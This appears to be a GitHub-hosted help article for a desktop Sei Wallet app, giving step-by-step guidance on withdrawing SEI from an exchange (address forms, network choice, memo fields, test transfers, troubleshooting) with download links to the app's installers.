![Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/raw/main/assets/banner-article.png)

<h1 align="center">Withdrawing SEI from an exchange to Sei Wallet</h1>

<p align="center">Withdraw to the right network and address form, with the memo if it is asked for.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

<div align="center">

| Platform | Requirements | File |
|:--|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

An exchange withdrawal fails in one of four places, and only one of them is the exchange's fault: the wrong network, the wrong address format, a memo field that was required and left empty, or a regional restriction that looks like a wallet error. Everything else - the address, the network, the first test transfer - is under your control, and it is worth ten minutes before the first withdrawal rather than an afternoon afterwards.

This guide assumes you already have the wallet set up; if you do not, [the wallet this guide is about](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md) covers what it is. If your SEI currently sits in another wallet rather than an exchange, the route is different and shorter, and one of the guides below will fit better.

## Step 1: get the address from the wallet, not from memory

Open the wallet, choose the account you want the funds in, and copy the receive address from the app. Do not paste an address you saved months ago, and do not accept one from a chat message.

Then check the first and last four characters against what the wallet shows. Addresses are long, and clipboard malware swaps them for a lookalike that differs in the middle - the ends are what you can actually verify by eye.

If the wallet shows two forms of the address, read the next section before choosing.

## Step 2: choose the right address form

One account, two spellings: `0x...` on the EVM side, `sei1...` on the Cosmos side, with an on-chain association tying the pair together. Which one an exchange wants depends on which deposit route that exchange supports.

- **An exchange that asks for a Sei EVM address** expects the `0x...` form. This is the current route, and it matches how the wallet signs.
- **An exchange that still asks for a `sei1...` address** is describing the older Cosmos-side deposit route. Sei's own documentation places that route under SIP-03 deprecation: the docs gave those interfaces a 15 June 2026 milestone, after which `sei1...` transfers would no longer broadcast and association would close, and exchanges are told to present the `0x...` address as the canonical one. The other historical route into Sei, IBC, is closed in both directions - outbound IBC went with Proposal #121 at the end of July 2026. So the `0x...` form is the one to give, and an exchange still advertising a `sei1...` deposit is a question for that exchange's support rather than something to solve on your side.
- **An exchange that offers "SEI (ERC-20)"** is offering a wrapped token on Ethereum, not native SEI. It is a different asset on a different chain, and sending it to a Sei address loses it.

The difference between the two forms is a chain-level association, not a wallet setting: one account, two representations.

Two rules follow. First, the network label on the withdrawal screen must match the address form you pasted. Second, if the exchange's instructions and the address form disagree, stop and ask the exchange - do not "fix" it by converting the address yourself.

## Step 3: the memo field

Some exchanges show a memo, tag or note field next to the address. It exists because the exchange credits deposits to a shared address and needs to know which customer sent the funds, and it is [the same memo the deposit side asks for](https://github.com/sei-chain/sei-wallet-setup/blob/main/memo-and-tag-for-exchange-deposits.md).

For an EVM-style deposit the field is usually absent or optional, because the deposit is credited to a unique address. When a memo **is** required and left empty, the funds generally still arrive at the exchange, but they are not credited to you automatically - that is a support ticket and a waiting period, not a theft, and it is the most common avoidable withdrawal mistake after the network choice.

If the field is there and marked required, fill it exactly, with no spaces and no invented characters. A memo is not a password and it is not something to guess.

## Step 4: minimums, fees and the address whitelist

Three exchange-side settings will block a withdrawal before it starts:

- **A minimum withdrawal amount.** Small test transfers often fall below it, which surprises people who want to send 1 SEI first.
- **A withdrawal fee**, taken in SEI or in the exchange's own accounting. Compare what leaves your balance with what the explorer shows arriving; they legitimately differ.
- **An address whitelist or trusted-address delay.** If the exchange requires a waiting period after adding a new address, plan for it rather than discovering it in a hurry.

None of these is a wallet setting, and no wallet can override them.

## Step 5: send a small amount first

Do this once per exchange-address pair, not once per withdrawal:

1. Withdraw the smallest amount the exchange allows.
2. Wait for it to show as confirmed on a block explorer, not merely as "sent" by the exchange.
3. Confirm the balance in the wallet, on the account you intended.
4. Only then withdraw the rest.

A test transfer costs one fee and rules out the network, address and memo mistakes in a single step. It is the cheapest insurance in this whole process.

## When it does not arrive

Work through the causes in order, because the later ones are rare and the earlier ones are common.

1. **Is the transaction confirmed?** An exchange "completed" status means it broadcast, not that the chain accepted it. Look up the transaction hash on an explorer.
2. **Was the network the one the address belongs to?** A withdrawal sent on Ethereum to a Sei address, or the reverse, will not appear.
3. **Was it the [right address form](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md)?** Funds sent to the `sei1` form of an account whose EVM side you are watching can take a step to appear; funds sent to a different account are a different problem.
4. **Was a memo required?** If so, the exchange has the funds and needs the ticket.
5. **Is the balance staked or in an unbonding entry?** Neither shows as liquid, and neither is a missing deposit.

If the exchange refuses the withdrawal outright with a message about your country or region, that is a restriction on the exchange side - its licence, its own compliance rules, or its supported-jurisdiction list. It is not a wallet error, and no wallet setting changes it. The only routes are a different exchange, or contacting that exchange's support; a VPN is not a fix, and using one to evade a restriction can freeze the account that holds your funds.

## Frequently asked questions

**Which network do I choose when withdrawing SEI?** The one that matches the address form: Sei for a `0x...` address. Never choose an ERC-20 option for a native Sei address.

**Do I need a memo?** Only if the exchange marks one as required. For an EVM-style deposit it is usually absent or optional; leaving a required one empty delays crediting rather than losing the funds.

**Why is my withdrawal pending?** Exchange-side review, a confirmation threshold, or a whitelist delay. Check the transaction hash on an explorer before assuming a wallet problem.

**Why does my country show as unavailable?** A restriction on the exchange side. It is not something a wallet or a VPN should be used to work around.

**Can I withdraw directly to a staked position?** No. A deposit arrives as liquid SEI; staking is a separate transaction you sign afterwards.

**What is the minimum withdrawal?** Set by the exchange, not the wallet, and it changes. Check it on the withdrawal screen before entering an amount.

**Can I withdraw to a `sei1` address?** Sei's documentation puts Cosmos-native interfaces under deprecation, with 15 June 2026 given as the milestone, so treat a `sei1` deposit form as out of date and confirm with the exchange before using it. The `0x` form is current.

## Download Sei Wallet

<div align="center">

| Platform | Installer |
|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [What Sei Wallet is and how a desktop Sei wallet works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)
- [The Sei memo field and exchange deposits into Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/memo-and-tag-for-exchange-deposits.md)
- [sei1 and 0x addresses in Sei Wallet: which one to use](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md)
- [Moving SEI out of Trust Wallet into Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/send-coins-out-of-trust.md)
